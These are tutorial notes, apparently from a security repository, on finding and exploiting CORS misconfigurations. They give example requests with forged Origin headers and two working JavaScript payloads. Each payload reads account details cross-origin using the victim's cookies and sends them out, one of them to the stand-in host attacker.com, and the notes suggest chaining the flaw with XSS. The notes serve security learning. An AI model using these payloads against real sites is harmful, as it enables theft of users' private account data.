**CORS Scenario**

![Screenshot From 2025-03-17 23-57-08](https://github.com/user-attachments/assets/96c5cf0f-9fc0-45a8-b364-776097cceb5c)

These headers state that access is allowed from the requesting domain `(malicious-website.com)` and that the cross-origin requests can include cookies `(Access-Control-Allow-Credentials: true)` and so will be processed in-session.

### Testing for CORS vulnerability
1. Change Origin Header to arbitrary domain.
```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: http://example.com to Origin: https://malicious.com
```
If it response with this, that means the website is vulnerable to CORS.
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious.com
Access-Control-Allow-Credentials: true
```
**Demo Payload For Basic Case**
```javascript
<html>
    <body>
        <h1>Hello World!</h1>
        <script>
            var xhr = new XMLHttpRequest();
            var url = "https://ac211f241efad3f2c045255700630006.web-security-academy.net"
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE){
                    fetch("/log?key=" + xhr.responseText)
                }
            }

            xhr.open('GET', url + "/accountDetails", true);
            xhr.withCredentials = true;
            xhr.send(null)
        </script>
    </body>
</html>
```
2. Change Origin Header to null.
```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: null
```
**Demo Payload For Null Case**
```javascript
<html>
    <body>
        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
        <script>
            var xhr = new XMLHttpRequest();
            var url = 'https://ac371f531f693ef3c07b84de00630017.web-security-academy.net'

            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    fetch('https://attacker.com/log?key=' + xhr.responseText)
                }
            }

            xhr.open('GET', url + '/accountDetails', true);
            xhr.withCredentials = true;
            xhr.send(null);
        </script>"></iframe>
    </body>
</html>
```
3. Change the origin header to one that begins with the origin of the site.
```
GET / HTTP/1.1
Host: vulnerable-website.com
Origin: https://vulnerable-website.com.malicious.com
```
4. Change the origin header to one that ends with the origin of the site.
```
GET / HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious.vulnerable-website.com
```
Note: If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application. So, if you find a CORS vulnerability, try to bind it with XSS attack.

---
